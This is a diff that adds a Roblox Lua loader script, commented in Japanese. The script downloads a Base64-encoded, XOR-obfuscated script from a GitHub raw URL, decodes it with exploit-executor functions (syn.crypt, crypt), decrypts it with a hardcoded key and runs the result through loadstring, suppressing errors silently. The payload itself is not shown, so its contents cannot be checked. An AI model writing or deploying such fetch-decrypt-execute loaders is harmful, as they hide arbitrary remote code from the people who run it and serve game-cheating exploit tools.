@@ -1,0 +1,57 @@
+local http = game:GetService("HttpService")
+
+-- 📜 GitHub から暗号化されたスクリプトを取得
+local encodedScript = game:HttpGet("https://raw.githubusercontent.com/YomogiBest/Test_XOR/main/Encoded_XOR_script.txt", true):gsub("%s+$", "")
+
+-- 🔄 Base64 をデコード
+local decodedScript
+local success, err = pcall(function()
+    if syn and syn.crypt and syn.crypt.base64.decode then
+        decodedScript = syn.crypt.base64.decode(encodedScript)
+    elseif crypt and crypt.base64decode then
+        decodedScript = crypt.base64decode(encodedScript)
+    else
+        error("❌ Base64 デコードがサポートされていません！")
+    end
+end)
+
+if not success then
+    print("❌ Base64 デコードエラー:", err)
+    return
+end
+
+-- 🔑 XOR 復号キー（エンコード時と同じキー）
+local key = "Testkey12345678910"
+
+-- 🔄 XOR で復号
+local function xor_decrypt(data, key)
+    local result = {}
+    local keyLength = #key
+    for i = 1, #data do
+        local keyByte = key:byte((i - 1) % keyLength + 1)
+        local dataByte = data:byte(i)
+        table.insert(result, string.char(bit32.bxor(dataByte, keyByte)))
+    end
+    return table.concat(result)
+end
+
+-- 🔓 XOR 復号
+local finalScript
+success, err = pcall(function()
+    finalScript = xor_decrypt(decodedScript, key)
+end)
+
+if not success then
+
+    return
+end
+
+-- 🚀 実行
+success, err = pcall(function()
+    assert(finalScript and #finalScript > 0, "❌ 復号スクリプトが空")
+    loadstring(finalScript)()
+end)
+
+if not success then
+
+end
